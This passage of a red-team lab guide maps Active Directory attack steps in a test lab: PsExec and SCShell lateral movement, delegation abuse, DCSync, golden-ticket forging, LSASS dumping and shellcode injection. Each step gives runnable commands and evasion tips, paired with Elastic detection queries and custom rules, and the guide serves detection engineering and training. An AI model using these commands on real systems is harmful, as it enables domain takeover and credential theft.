**MITRE ATT&CK:** T1021.002 (Remote Services: SMB/Windows Admin Shares), T1569.002 (System Services: Service Execution)

**Pentest Command (from Kali):**

```bash
impacket-psexec north.sevenkingdoms.local/samwell.tarly:'Heartsbane'@10.1.10.11
```

**C2 Command (from castelblack agent):**

Use the psexec BOF. First make token as `samwell.tarly`

```
token make -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local
token list
token impersonate 8529
```

![](image/red-team-workflow/20260922165540.png)

Create custom service name and binary name to reduce signature:

```
jump psexec -b svcutil.exe -n "WinConfigSvc" -d "Manages system configuration updates" 10.1.10.11 /local/path/to/smb_x64_svc.exe
```

> The SMB beacon would have been the best and realistic option for this, however Kharon Listener config doesn't yet support SMB. If you had to use the default Adaptix SMB beacon, run `link smb <target_ip> <pipe_name>` right after the command below to connect to the SMB beacon. 

![](image/red-team-workflow/20260922165526.png)

![](image/red-team-workflow/20260922165516.png)

Full syntax:

```
jump psexec <target> <binary> [-b binary_name] [-s share] [-p svc_path] [-n svc_name] [-d svc_description]
```

| Flag | Default | Purpose |
|------|---------|---------|
| `-b` | random | Remote binary name on the target. |
| `-s` | ADMIN$ | Share to copy the binary to. |
| `-p` | C:\Windows | Service file path on the target. |
| `-n` | random | Service name to create. |
| `-d` | random | Service description. |

**OPSEC Comparison:**

| Factor | Pentest (impacket psexec) | Red Team (jump psexec BOF) |
|--------|--------------------------|----------------------|
| Source | External IP | Internal SRV02 IP |
| Service name | Random 8-char name | Custom name (less suspicious) |
| Binary name | Random .exe in ADMIN$ | Custom name in chosen path |
| Named pipe | \pipe\svcctl | \pipe\svcctl |
| Service creation | Event ID 7045 | Event ID 7045 |

**Elastic Queries - Detect PsExec:**

```
rule.name:"PsExec Network Connection"
```

```
rule.name:"Suspicious Process Execution via Renamed PsExec Executable"
```

```
rule.name:"Suspicious Service was Installed in the System" OR rule.name:"Suspicious ImagePath Service Creation"
```

```
rule.name:"Remote Windows Service Installed"
```

Sysmon named pipe detection:

```
event.code:"17" AND winlog.event_data.PipeName:*svcctl*
```

---

### 5.3 - SCShell (Service Binary Path Modification, Recommended)

**MITRE ATT&CK:** T1569.002 (System Services: Service Execution), T1543.003 (Create or Modify System Process: Windows Service)

> This approach was not followed due to a bug in the [Kharon agent](https://github.com/entropy-z/Kharonto).

SCShell modifies an existing service binary path instead of creating a new service. This avoids Event ID 7045 (new service creation).

**Pentest equivalent:** No direct equivalent. Impacket's `smbexec.py` uses a similar technique.

**C2 Command (from castelblack agent):**

First make token as `samwell.tarly`

```
token make -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local
token list
token impersonate 8529
```

![](image/red-team-workflow/20260922165540.png)

With a specific service name and custom binary name:

```
jump scshell 10.1.10.11 /local/path/to/smb_x64_svc.exe -n defragsvc -b update.exe -s C$ -p C:\Windows
```

> The SMB beacon would have been the best and realistic option for this, however Kharon Listener config doesn't yet support SMB as previously explained in section 5.2. If you had to use the default Adaptix SMB beacon, run `link smb <target_ip> <pipe_name>` right after the command below to connect to the SMB beacon. 

![](image/red-team-workflow/20260922165815.png)

![](image/red-team-workflow/20260922165720.png)

Full syntax:

```
jump scshell <target> <binary> [-b binary_name] [-s share] [-p svc_path] [-n service_name]
```

| Flag | Default | Purpose |
|------|---------|---------|
| `-b` | random | Remote binary name on the target. |
| `-s` | ADMIN$ | Share to copy the binary to. |
| `-p` | C:\Windows | Service file path on the target. |
| `-n` | defragsvc | Existing service name to modify. |

Recommended service targets (services that are not critical and can be safely modified):
- `defragsvc` (Disk defragmentation, default)
- `SensorService` (Sensor monitoring)
- `SessionEnv` (Remote Desktop configuration)
- `IKEEXT` (IKE and AuthIP)

**OPSEC advantage:** No new service creation. The existing service's `ImagePath` is temporarily changed, payload executes, then the original path is restored.

For command execution without deploying a beacon, use `invoke scshell`:

```
invoke scshell 10.1.10.11 defragsvc "cmd.exe /c whoami > C:\Windows\Temp\out.txt"
```

Full syntax:

```
invoke scshell <target> <service_name> <command>
```

**Elastic Queries - Detect SCShell:**

No prebuilt rule specifically detects SCShell. The detection relies on registry modification of service ImagePath:

```
event.code:"13" AND winlog.event_data.TargetObject:*Services* AND winlog.event_data.TargetObject:*ImagePath* AND NOT winlog.event_data.Image:(*svchost.exe* OR *services.exe* OR *TrustedInstaller.exe*)
```

Service start/stop events:

```
event.code:"7036" AND winlog.event_data.param1:("SensorService" OR "defragsvc" OR "SessionEnv" OR "IKEEXT")
```

![](image/red-team-workflow/20260922171135.png)

---

### 5.4 - RDP (Interactive Desktop Access)

**MITRE ATT&CK:** T1021.001 (Remote Services: Remote Desktop Protocol)

**Pentest Command (from Kali):**

```bash
xfreerdp /v:10.1.10.11 /u:jon.snow /p:'iknownothing' /dynamic-resolution /timeout:60000 /cert:ignore
```

**C2 Command (from castelblack agent):**

Use the SOCKS proxy for RDP through the beacon, as any user:

```
socks start 1080
```

From Kali:

```bash
proxychains -q xfreerdp /v:10.1.10.11 /u:jon.snow /p:'iknownothing' /dynamic-resolution /cert:ignore
```

RDP is the same protocol either way. The SOCKS proxy only changes the source IP from Kali to the beacon host.

**Elastic Query - Detect RDP:**

```
rule.name:"Potential Remote Desktop Tunneling Detected"
```

```
event.code:"4624" AND winlog.event_data.LogonType:"10"
```

![](image/red-team-workflow/20260922170439.png)

---

## 6 - Domain Escalation

### 6.1 - Constrained Delegation Abuse (jon.snow)

**MITRE ATT&CK:** T1550.003 (Use Alternate Authentication Material: Pass the Ticket), T1558 (Steal or Forge Kerberos Tickets)

**Pentest Command (from Kali):**

```bash
impacket-findDelegation -dc-ip 10.1.10.11 "north.sevenkingdoms.local/jon.snow:iknownothing"
```

**C2 Command (from castelblack agent):**

Step 1 - Enumerate delegation:

```
ldapsearch (msDS-AllowedToDelegateTo=*) -a sAMAccountName,msDS-AllowedToDelegateTo,userAccountControl
```

![](image/red-team-workflow/20260922143635.png)

Step 2 - Request TGT for jon.snow:

```
kerbeus asktgt /user:jon.snow /password:iknownothing /domain:north.sevenkingdoms.local /enctype:aes256 /opsec
```

![](image/red-team-workflow/20260922143744.png)

Step 3 - Perform S4U attack (S4U2Self + S4U2Proxy) to impersonate Administrator to CIFS on winterfell:

```
kerbeus s4u /impersonateuser:Administrator /service:CIFS/winterfell.north.sevenkingdoms.local /domain:north.sevenkingdoms.local /ptt /ticket:<base64_tgt_from_step2>
```

![](image/red-team-workflow/20260922143846.png)

```
kerbeus describe /ticket::<base64_tgt_from_step3>
```

![](image/red-team-workflow/20260922144629.png)

```
kerbeus ptt /ticket::<base64_tgt_from_step3>
```

![](image/red-team-workflow/20260922145329.png)

```
kerbeus klist
```

![](image/red-team-workflow/20260922145348.png)

```
dir \\winterfell.north.sevenkingdoms.local\c$
```

![](image/red-team-workflow/20260922145431.png)

Full syntax:

```
kerbeus s4u /ticket:BASE64 /service:SPN /impersonateuser:USER [/domain:DOMAIN] [/dc:DC] [/altservice:SERVICE] [/ptt] [/nopac] [/opsec] [/self]
```

**OPSEC Comparison:**

| Factor | Pentest (findDelegation + getST) | Red Team (kerbeus BOF) |
|--------|----------------------------------|----------------------|
| Source | External IP | Internal domain host |
| Protocol | Kerberos from Kali | Kerberos from beacon |
| Process artifact | None on target | None (BOF in-memory) |
| Ticket handling | ccache file on Kali | Injected into current LUID via `/ptt` |

**Elastic Queries - Detect Delegation Abuse:**

```
rule.name:"Sensitive Privilege SeEnableDelegationPrivilege assigned to a User"
```

S4U2Proxy generates Event 4769 with the `TransmittedServices` field populated. This auditing is not enabled by default. Enable it on both DCs via Proxmox before running the attack:

```bash
# DC02 (winterfell, VMID 111)
ssh root@192.168.1.100 "qm guest exec 111 -- powershell.exe -Command 'auditpol /set /subcategory:\"Kerberos Service Ticket Operations\" /success:enable /failure:enable'"

# DC01 (kingslanding, VMID 110)
ssh root@192.168.1.100 "qm guest exec 110 -- powershell.exe -Command 'auditpol /set /subcategory:\"Kerberos Service Ticket Operations\" /success:enable /failure:enable'"
```

Then query for S4U2Proxy events:

```
event.code:"4769" AND winlog.event_data.TransmittedServices:*
```

![](image/red-team-workflow/20260922151221.png)

---

### 6.2 - ExtraSids / Golden Ticket (Child-to-Parent Domain)

**MITRE ATT&CK:** T1558.001 (Steal or Forge Kerberos Tickets: Golden Ticket)

**Pentest Command (from Kali):**

```bash
raiseChild.py -target-exec 10.1.10.10 north.sevenkingdoms.local/samwell.tarly:Heartsbane
```

Or the manual path:

```bash
ticketer.py -aesKey <krbtgt_aes> -domain-sid S-1-5-21-... -domain north.sevenkingdoms.local -extra-sid S-1-5-21-...-519 Administrator
secretsdump.py -k -no-pass 'north.sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local' -just-dc-user 'sevenkingdoms/Administrator'
```

**C2 Command (from winterfell agent after lateral movement, running as SYSTEM):**

After moving laterally to winterfell (DC02) and escalating to SYSTEM (see Section 5), extract the krbtgt hash. Since you have SYSTEM on DC02, use lsadump (no DCSync replication traffic):

```
lsadump_secrets
```

![](image/red-team-workflow/20260922153145.png)

Or if lsadump does not return the krbtgt key, use DCSync for just the krbtgt:

```
dcsync single krbtgt -dc winterfell.north.sevenkingdoms.local
```

![](image/red-team-workflow/20260922153207.png)

Step 2 - Create a Golden Ticket with ExtraSids. The Kerbeus-BOF does not have a `golden` subcommand. Use `execute-assembly` with Rubeus:

```
execute-assembly /path/to/Rubeus.exe golden /user:Administrator /domain:north.sevenkingdoms.local /sid:S-1-5-21-3070733070-37185155-1944012974 /aes256:<krbtgt_aes256_from_step1> /sids:S-1-5-21-4129000305-2956170768-4065605194-519 /ptt /nowrap /simple
```

![](image/red-team-workflow/20260922155657.png)

![](image/red-team-workflow/20260922155708.png)

Or forge the ticket offline via SOCKS and inject it:

```
socks start 1080
```

From Kali:

```bash
proxychains -q ticketer.py -aesKey <krbtgt_aes> \
  -domain-sid S-1-5-21-3070733070-37185155-1944012974 \
  -domain north.sevenkingdoms.local \
  -extra-sid S-1-5-21-4129000305-2956170768-4065605194-519 \
  Administrator
```

Then convert and inject via kerbeus:

```bash
ticketConverter.py Administrator.ccache Administrator.kirbi
base64 -w 0 Administrator.kirbi
```

Back in the [Kharon agent](https://github.com/entropy-z/Kharonto):

```
kerbeus ptt /ticket:<base64_kirbi>
```

![](image/red-team-workflow/20260922155741.png)

Step 3a - Move to DC01 (kingslanding) via manual upload and invoke scshell:

```
dir \\kingslanding.sevenkingdoms.local\ADMIN$
```

![](image/red-team-workflow/20260922155811.png)

```
upload /local/path/to/http_x64.exe \\kingslanding.sevenkingdoms.local\ADMIN$\http_x64.exe
```

![](image/red-team-workflow/20260922160121.png)

```
invoke scshell kingslanding.sevenkingdoms.local defragsvc "C:\Windows\http_x64.exe"
```

![](image/red-team-workflow/20260922160132.png)

![](image/red-team-workflow/20260922160214.png)

Step 3b - Alternative: Move to DC01 via jump scshell BOF (single command, avoids Event ID 7045):

```
jump scshell kingslanding.sevenkingdoms.local /path/to/http_x64.exe -n defragsvc
```

![](image/red-team-workflow/20260922160516.png)

![](image/red-team-workflow/20260922160527.png)

**OPSEC Warning:** Golden Ticket usage generates Event 4769 with potentially anomalous ticket lifetimes. ExtraSids specifically triggers SID filtering checks if inter-forest (but not intra-forest child-to-parent).

**Elastic Queries - Detect Golden Ticket / ExtraSids:**

```
rule.name:"* DCSync"
```

```
rule.name:"KRBTGT Delegation Backdoor"
```

```
rule.name:"Potential Credential Access via DCSync"
```

For Kerberos anomalies:

```
event.code:"4769" AND winlog.event_data.ServiceName:"krbtgt"
```

![](image/red-team-workflow/20260922162130.png)

---

## 7 - Post-Exploitation

### 7.1 - File Operations

**MITRE ATT&CK:** T1039 (Data from Network Shared Drive)

**Pentest Command (downloading files from shares):**

```bash
smbclient -U "samwell.tarly" //10.1.10.22/all
smb: \> get arya.txt
```

**C2 Command (from castelblack agent):**

```
fs ls \\10.1.10.22\all
fs cat \\10.1.10.22\all\arya.txt
```

![](image/red-team-workflow/20260922160926.png)

Or download to the C2 server:

```
download C:\path\to\target\file.txt
```

Full filesystem syntax:

```
fs pwd
fs cd <path>
fs ls <path>
fs cat <path>
fs mkdir <path>
fs cp <source> <destination>
fs mv <source> <destination>
fs rm <path>
```

**Elastic Query:**

No specific detection for file reads through SMB from an authenticated domain user.

---

### 7.2 - NETLOGON Script Discovery

**MITRE ATT&CK:** T1552.001 (Unsecured Credentials: Credentials in Files)

**Pentest Command (from Kali):**

```bash
smbclient -U "jon.snow" //10.1.10.11/NETLOGON
smb: \> get script.ps1
smb: \> get secret.ps1
```

**C2 Command (from castelblack agent):**

```
fs ls \\winterfell.north.sevenkingdoms.local\NETLOGON
fs cat \\winterfell.north.sevenkingdoms.local\NETLOGON\script.ps1
fs cat \\winterfell.north.sevenkingdoms.local\NETLOGON\secret.ps1
```

**Elastic Query:**

NETLOGON access is normal domain traffic. No prebuilt rule fires. You can audit access with:

```
event.code:"5145" AND winlog.event_data.ShareName:*NETLOGON*
```

---

### 7.3 - Situational Awareness

**MITRE ATT&CK:** T1033 (System Owner/User Discovery), T1016 (System Network Configuration Discovery), T1082 (System Information Discovery)

**Pentest Commands (from compromised host):**

```
whoami /all
ipconfig /all
net localgroup administrators
```

**C2 BOF Commands (from any agent):**

```
whoami
ipconfig
```

![](image/red-team-workflow/20260922161422.png)

```
arp
```

![](image/red-team-workflow/20260922161334.png)

```
env
```

![](image/red-team-workflow/20260922161228.png)

```
routeprint
```

![](image/red-team-workflow/20260922161251.png)

```
uptime
```

![](image/red-team-workflow/20260922161356.png)

All of these are SAL-BOF modules. They run as BOFs in the beacon process memory. They do not spawn child processes.

Additional SAL-BOF commands:

```
dir <path> [/s]
cacls <path>
nslookup <domain> [server] [type]
listdns
useridletime
privcheck <module>
```

The `privcheck` BOF accepts these modules for local privilege escalation checks: `alwayselevated`, `hijackablepath`, `tokenpriv`, `unattendfiles`, `unquotedsvc`, `vulndrivers`.

**OPSEC Advantage:** No `cmd.exe`, `whoami.exe`, or `net.exe` process creation events. The BOFs call the underlying Windows APIs directly from the beacon process.

**Elastic Queries - Detect Discovery Commands:**

```
rule.name:"Account or Group Discovery via Built-In Tools"
```

```
rule.name:"Enumeration of Administrator Accounts"
```

These rules detect `net.exe` or `whoami.exe` process creation. BOF-based equivalents do not trigger these rules because no child process is created.

---

## 8 - Shellcode Injection (for New Beacon Deployment)

### 8.1 - CreateRemoteThread (Built-in Kharon Method)

**MITRE ATT&CK:** T1055 (Process Injection)

The Kharon `scinject` command and `kit_explicit_inject.cc` use VirtualAllocEx + WriteProcessMemory + VirtualProtectEx + CreateRemoteThread.

**C2 Command:**

```
scinject <target_pid> /path/to/shellcode.bin
```


![](image/red-team-workflow/20260922163810.png)

![](image/red-team-workflow/20260922163754.png)

Or via postex fork with explicit injection into an existing process:

```
execute postex -m fork -t explicit -p <target_pid> -f /path/to/shellcode.bin -a ""
```

Full postex syntax:

```
execute postex -m <inline|fork> -t <none|spawn|explicit> -p <pid> -f <file> -a <args>
```

| Flag | Values | Purpose |
|------|--------|---------|
| `-m` | `inline`, `fork` | `inline` runs in current process. `fork` runs in a new or existing process. |
| `-t` | `none`, `spawn`, `explicit` | `spawn` creates a new sacrificial process (uses `spawnto`). `explicit` injects into an existing PID. |
| `-p` | PID | Target PID for explicit injection. |
| `-f` | file path | Path to the shellcode file on the C2 server. |
| `-a` | string | Arguments to pass to the shellcode module. |

**Elastic Queries:**

```
rule.name:"Process Injection - Detected - Elastic Endgame"
```

Sysmon Event 8 (CreateRemoteThread):

```
event.code:"8" AND NOT winlog.event_data.SourceImage:(*csrss.exe* OR *wininit.exe* OR *winlogon.exe* OR *services.exe* OR *lsass.exe* OR *svchost.exe*)
```

![](image/red-team-workflow/20260922163943.png)


---

### 8.2 - Extension-Kit Injection BOFs

**MITRE ATT&CK:** T1055 (Process Injection)

The Injection-BOF module provides four alternative injection methods.

**inject-sec (Section mapping):**

```
inject-sec <pid> <shellcode_file>
```

![](image/red-team-workflow/20260922163302.png)

![](image/red-team-workflow/20260922161820.png)

Uses NtCreateSection + NtMapViewOfSection instead of VirtualAllocEx and WriteProcessMemory. The memory allocation and write calls are different from CreateRemoteThread injection. However, a remote thread is still created to execute the mapped section.

**Elastic Queries:**

```
rule.name:"Process Injection - Detected - Elastic Endgame"
```

Sysmon Event 8 (CreateRemoteThread):

```
event.code:"8" AND NOT winlog.event_data.SourceImage:(*csrss.exe* OR *wininit.exe* OR *winlogon.exe* OR *services.exe* OR *lsass.exe* OR *svchost.exe*)
```

![](image/red-team-workflow/20260922162950.png)

Any remote process injection that creates a thread in another process can trigger Sysmon Event ID 8 (CreateRemoteThread). Even if Adaptix uses indirect syscalls to call `NtCreateThreadEx`, Sysmon hooks the kernel callback for remote thread creation. The event is still logged regardless of the user-mode call path.

---

## 9 - Detection Coverage Summary

### 9.1 - Prebuilt Elastic Rules That Fire per Attack Phase

| Attack Phase | Pentest Method | Red Team C2 Method | Prebuilt Rules That Fire |
|-------------|----------------|-------------------|------------------------|
| Host Discovery | nmap -sn | smartscan BOF | Potential Network Scan Executed From Host |
| User Enumeration | nxc --users | ldapsearch BOF | None (standard attributes do not trigger LDAP rule, see Section 2.2) |
| AS-REP Roast | GetNPUsers | kerbeus asreproasting | None (custom rule required) |
| Kerberoast | GetUserSPNs | kerbeus kerberoasting | None (custom rule required) |
| Credential Dump (LSASS) | mimikatz on disk | nanodump -sc BOF | Pentest: 5+ rules. Red Team: 0-1 rules |
| Credential Dump (SAM) | hashdump on disk | hashdump BOF | Credential Acquisition via Registry Hive Dumping |
| DCSync | secretsdump.py | dcsync single BOF | Potential Credential Access via DCSync |
| GPO Abuse | pygpoabuse direct | pygpoabuse via SOCKS | Group Policy Abuse for Privilege Addition |
| Lateral (PsExec) | impacket-psexec | jump psexec BOF | PsExec Network Connection, Remote Windows Service Installed |
| Lateral (SCShell) | N/A | jump scshell BOF | None (custom registry query required) |
| Lateral (WinRM) | evil-winrm | invoke winrm BOF | Incoming Execution via WinRM Remote Shell |
| Lateral (RDP) | xfreerdp direct | xfreerdp via SOCKS | Potential Remote Desktop Tunneling Detected |
| Golden Ticket | ticketer.py | execute-assembly Rubeus golden | KRBTGT Delegation Backdoor |
| Injection (CRT) | N/A | scinject | Process Injection - Detected, Sysmon Event 8 |
| Injection (PoolParty) | N/A | inject-poolparty | None |
| Injection (Section) | N/A | inject-sec | Sysmon Event 8 (remote thread creation, see Section 8.2) |
| Discovery | whoami, net, ipconfig | SAL BOFs | Pentest: Account/Group Discovery. Red Team: None |

### 9.2 - Detection Gaps (No Prebuilt Rule Fires)

These C2 actions have no prebuilt Elastic detection in the current 152-rule set:

1. **AS-REP Roasting** - Requires custom rule on Event 4768 with PreAuthType 0
2. **Kerberoasting** - Requires custom rule on Event 4769 with EncryptionType 0x17
3. **SCShell lateral movement** - Requires custom rule on registry ImagePath modification (Event 13)
4. **inject-sec (section mapping)** - NtCreateSection and NtMapViewOfSection generate no Sysmon events, but the remote thread creation still triggers Event ID 8 (see Section 8.2)
5. **inject-poolparty (thread pool abuse)** - No Sysmon event generated for thread pool item insertion
6. **inject-cfg (CFG hijacking)** - No Sysmon event generated for COM pointer overwrite
7. **BOF-based discovery** (whoami, ipconfig, arp, etc.) - No child process created, no Event ID 1
8. **ADWS enumeration** (adwssearch BOF) - Different protocol (TCP 9389) than monitored LDAP (TCP 389)
9. **nanodump with spoofed callstack** (-sc flag) - Spoofed callstack evades Sysmon Event 10 CallTrace field checks
10. **Sleep obfuscation / heap masking** - In-memory technique, no event generated

### 9.3 - Custom Detection Rules to Close Gaps

**Custom Rule 1 - AS-REP Roasting:**

```
Name: AS-REP Roasting Attempt
Index: logs-windows.forwarded-*
KQL: event.code:"4768" AND winlog.event_data.PreAuthType:"0"
Severity: High
MITRE: T1558.004
```

**Custom Rule 2 - Kerberoasting (RC4 Downgrade):**

```
Name: Kerberoasting via RC4 TGS Request
Index: logs-windows.forwarded-*
KQL: event.code:"4769" AND winlog.event_data.TicketEncryptionType:"0x17" AND NOT winlog.event_data.ServiceName:*$
Severity: High
MITRE: T1558.003
```

**Custom Rule 3 - Service ImagePath Modification (SCShell):**

```
Name: Service Binary Path Modified (Potential SCShell)
Index: logs-windows.sysmon_operational-*
KQL: event.code:"13" AND winlog.event_data.TargetObject:*\\Services\\* AND winlog.event_data.TargetObject:*ImagePath* AND NOT winlog.event_data.Image:(*svchost.exe* OR *services.exe* OR *TrustedInstaller.exe*)
Severity: Medium
MITRE: T1569.002
```

**Custom Rule 4 - Unusual ADWS Connection:**

```
Name: Active Directory Web Service Query from Non-DC
Index: logs-endpoint.*
KQL: destination.port:9389 AND NOT source.ip:("10.1.10.10" OR "10.1.10.11")
Severity: Low
MITRE: T1069
```

---

## 10 - Full Attack Chain Mapping

### 10.1 - Path A

Starting point: Low-privilege [Kharon agent](https://github.com/entropy-z/Kharonto) on castelblack (SRV02) as samwell.tarly.

| Step | Phase | C2 Action | Pentest Equivalent | Detection |
|------|-------|-----------|-------------------|-----------|
| 1 | Recon | `smartscan 10.1.10.0/24 -p standart` | `nmap -sn 10.1.10.0/24` | Network Scan rule |
| 2 | Recon | `ldapsearch (objectClass=user) -a sAMAccountName,description` | `nxc smb DC02 --users` | LDAP Attributes rule |
| 3 | Recon | `adwssearch` or `execute-assembly SharpHound.exe` | `bloodhound-python -c ALL` | Enumeration rules |
| 4 | Creds | `kerbeus asreproasting /user:brandon.stark` | `GetNPUsers brandon.stark` | Custom rule needed |
| 5 | Creds | `kerbeus asktgt` then `kerbeus kerberoasting` | `GetUserSPNs -request` | Custom rule needed |
| 6 | Creds | Offline: `hashcat -m 18200` / `-m 13100` | Same | N/A (offline) |
| 7 | PrivEsc | `socks start` + `proxychains pygpoabuse.py` | `pygpoabuse.py` (from Kali) | GPO Abuse rule |
| 8 | PrivEsc | `getsystem token` (local admin after GPO refresh) | N/A | Privilege Escalation rules |
| 9 | Creds | `nanodump -sc --valid` (as SYSTEM) | `mimikatz logonpasswords` (on disk) | Pentest: 5+ rules. C2: 0-1 |
| 10 | Lateral | `token make` as jeor.mormont (local admin, creds from nanodump) | `evil-winrm` as jeor.mormont | None |
| 11 | Lateral | `jump scshell winterfell http_x64.exe` (jeor.mormont token) | `evil-winrm -i DC02` | No rule (SCShell) |
| 12 | PrivEsc | `getsystem token` (on winterfell) | N/A | Privilege Escalation rules |
| 13 | Domain | `lsadump_secrets` (SYSTEM on DC02) | `raiseChild.py samwell.tarly` | Registry Hive rule |
| 14 | Domain | `execute-assembly Rubeus.exe golden /sids:...-519` | `ticketer.py -extra-sid ...-519` | KRBTGT Delegation rule |
| 15 | Domain | `jump scshell kingslanding http_x64.exe` | `secretsdump.py -k kingslanding` | No rule (SCShell) |

### 10.2 - Path B

Starting point: Low-privilege [Kharon agent](https://github.com/entropy-z/Kharonto) on castelblack (SRV02) as samwell.tarly.

| Step | Phase | C2 Action | Pentest Equivalent | Detection |
|------|-------|-----------|-------------------|-----------|
| 1 | Recon | `smartscan 10.1.10.0/24 -p 445` | `nxc smb 10.1.10.0/24` | Network Scan rule |
| 2 | Recon | `process create "net view \\SRV02 /all"` | `smbclient -N -L //SRV02` | Windows Network Enumeration |
| 3 | Recon | `ldapsearch (objectClass=user) -a sAMAccountName,description` | `nxc smb DC02 --users` | LDAP Attributes rule |
| 4 | Recon | `fs ls C:\Shares\all` | `nxc smb SRV02 --shares` | None |
| 5 | Recon | `fs cat C:\Shares\all\arya.txt` | `smbclient get arya.txt` | None |
| 6 | Creds | `kerbeus asreproasting /user:brandon.stark` | `GetNPUsers brandon.stark` | Custom rule needed |
| 7 | Creds | Offline: `hashcat -m 18200` | Same | N/A |
| 8 | Creds | `kerbeus asktgt` then `kerbeus kerberoasting` | `Rubeus.exe kerberoast` (on disk) | Custom rule needed |
| 9 | Creds | Offline: `hashcat -m 13100` (jon.snow cracked) | Same | N/A |
| 10 | Recon | `fs cat \\winterfell\NETLOGON\script.ps1` (jeor.mormont creds) | `smbclient //NETLOGON get script.ps1` | None |
| 11 | PrivEsc | `token make` as jeor.mormont (local admin) | `nxc smb jeor.mormont (Pwn3d!)` | None |
| 12 | PrivEsc | `getsystem token` (SYSTEM via jeor.mormont) | N/A | Privilege Escalation rules |
| 13 | Creds | `nanodump -sc --valid` (as SYSTEM) | `mimikatz logonpasswords` (on disk) | Pentest: 5+ rules. C2: 0-1 |
| 14 | Recon | `execute-assembly SharpHound.exe --Throttle 3000` | `SharpHound.exe` (on disk) | Enumeration rules |
| 15 | Creds | Offline: `hashcat -m 1000` (robb.stark cracked) | Same | N/A |
| 16 | Lateral | `jump scshell winterfell http_x64.exe` (robb.stark token) | `evil-winrm -i DC02` | No rule (SCShell) |
| 17 | PrivEsc | `getsystem token` (on winterfell) | N/A | Privilege Escalation rules |
| 18 | Creds | `lsadump_secrets` (SYSTEM on DC02) | `secretsdump.py robb.stark@DC02` | Registry Hive rule |
| 19 | Domain | `execute-assembly Rubeus.exe golden /sids:...-519` | `lookupsid.py + ticketer.py` | KRBTGT Delegation rule |
| 20 | Domain | `jump scshell kingslanding http_x64.exe` | `secretsdump.py -k kingslanding` | No rule (SCShell) |

---

## Appendix A - Extension-Kit BOF Quick Reference

### AD-BOF

| Command | Syntax | Purpose |
|---------|--------|---------|
| `ldapsearch` | `ldapsearch <query> [-a attrs] [-c count] [-s scope]` | LDAP query |
| `adwssearch` | `adwssearch <query> [-a attrs] [--dc dc]` | ADWS query (TCP 9389), lower detection |
| `ldapq computers` | `ldapq computers` | List domain computers |
| `readlaps` | `readlaps [-target target]` | Read LAPS passwords |
| `dcsync single` | `dcsync single <target> [-dc DC] [--only-nt]` | DCSync single user |
| `dcsync all` | `dcsync all [-dc DC] [--only-nt] [--only-users]` | DCSync all users |
| `badtakeover` | `badtakeover <ou> <account> <sid> <dn> <domain>` | BadSuccessor technique |
| `webdav enable` | `webdav enable` | Enable WebDAV client |
| `webdav status` | `webdav status <host1,host2>` | Check WebDAV status |

### Kerbeus-BOF

| Command | Syntax | Purpose |
|---------|--------|---------|
| `kerbeus asktgt` | `kerbeus asktgt /user:U /password:P [/enctype:E] [/ptt]` | Request TGT |
| `kerbeus asktgt` (hash) | `kerbeus asktgt /user:U /aes256:HASH [/ptt]` | TGT with AES key |
| `kerbeus asktgt` (rc4) | `kerbeus asktgt /user:U /rc4:HASH [/ptt]` | TGT with NT hash |
| `kerbeus asktgs` | `kerbeus asktgs /ticket:B64 /service:SPN [/ptt]` | Request TGS |
| `kerbeus asreproasting` | `kerbeus asreproasting /user:U [/domain:D]` | AS-REP roast |
| `kerbeus kerberoasting` | `kerbeus kerberoasting /spn:SPN /ticket:B64` | TGS for cracking |
| `kerbeus kerberoasting` (nopreauth) | `kerbeus kerberoasting /spn:SPN /nopreauth:USER` | Kerberoast without auth |
| `kerbeus s4u` | `kerbeus s4u /ticket:B64 /service:SPN /impersonateuser:U` | S4U2Self + S4U2Proxy |
| `kerbeus cross_s4u` | `kerbeus cross_s4u /ticket:B64 /service:SPN /targetdomain:D` | Cross-domain S4U |
| `kerbeus ptt` | `kerbeus ptt /ticket:B64` | Pass the ticket |
| `kerbeus klist` | `kerbeus klist [/luid:ID]` | List tickets |
| `kerbeus purge` | `kerbeus purge [/luid:ID]` | Purge tickets |
| `kerbeus dump` | `kerbeus dump [/luid:ID] [/user:U]` | Dump tickets |
| `kerbeus triage` | `kerbeus triage [/luid:ID]` | Triage tickets |
| `kerbeus describe` | `kerbeus describe /ticket:B64` | Describe ticket |
| `kerbeus hash` | `kerbeus hash /password:P [/user:U]` | Compute Kerberos keys |
| `kerbeus changepw` | `kerbeus changepw /ticket:B64 /new:P` | Change password |
| `kerbeus renew` | `kerbeus renew /ticket:B64 [/ptt]` | Renew ticket |
| `kerbeus tgtdeleg` | `kerbeus tgtdeleg [/target:SPN]` | TGT delegation trick |

### Creds-BOF

| Command | Syntax | Purpose |
|---------|--------|---------|
| `hashdump` | `hashdump` | SAM hive dump |
| `lsadump_sam` | `lsadump_sam` | SAM via LSA |
| `lsadump_secrets` | `lsadump_secrets` | LSA secrets |
| `lsadump_cache` | `lsadump_cache` | Cached domain creds (DCC2) |
| `nanodump` | `nanodump [-w path] [--valid] [-sc] [--fork] [--snapshot] [--pid PID]` | LSASS minidump (stealthy) |
| `credman` | `credman` | Credential Manager dump |
| `get-netntlm` | `get-netntlm [--no-ess]` | Local NetNTLM extraction |
| `autologon` | `autologon` | Read autologon registry |
| `askcreds` | `askcreds [-p prompt] [-n note] [-t wait_time]` | Prompt user for creds |

### Execution-BOF

| Command | Syntax | Purpose |
|---------|--------|---------|
| `execute-assembly` | `execute-assembly <path> [params]` | In-process .NET assembly |
| `execute bof` | `execute bof -f <file> -a <args>` | Run Beacon Object File |
| `execute postex` | `execute postex -m <inline\|fork> -t <type> -p <pid> -f <file>` | Run shellcode module |

### Injection-BOF

| Command | Syntax | Purpose |
|---------|--------|---------|
| `scinject` | `scinject <pid> <shellcode_file>` | CRT injection (built-in Kharon) |
| `inject-cfg` | `inject-cfg <pid> <shellcode_file>` | CFG pointer hijack |
| `inject-sec` | `inject-sec <pid> <shellcode_file>` | Section mapping |
| `inject-poolparty` | `inject-poolparty <technique_id> <pid> <shellcode_file>` | Thread pool abuse (8 variants) |
| `inject-32to64` | `inject-32to64 <pid> <shellcode_file>` | WOW64 cross-arch injection |

### LateralMovement-BOF

| Command | Syntax | Purpose |
|---------|--------|---------|
| `jump psexec` | `jump psexec <target> <binary> [-n svc_name]` | Service-based execution |
| `jump scshell` | `jump scshell <target> <binary> [-n service_name]` | Service ImagePath modification |
| `invoke winrm` | `invoke winrm <target> <cmd> [-u DOMAIN\user] [-p pass]` | WinRM command execution |
| `invoke scshell` | `invoke scshell <target> <service_name> <command>` | SCShell command execution |
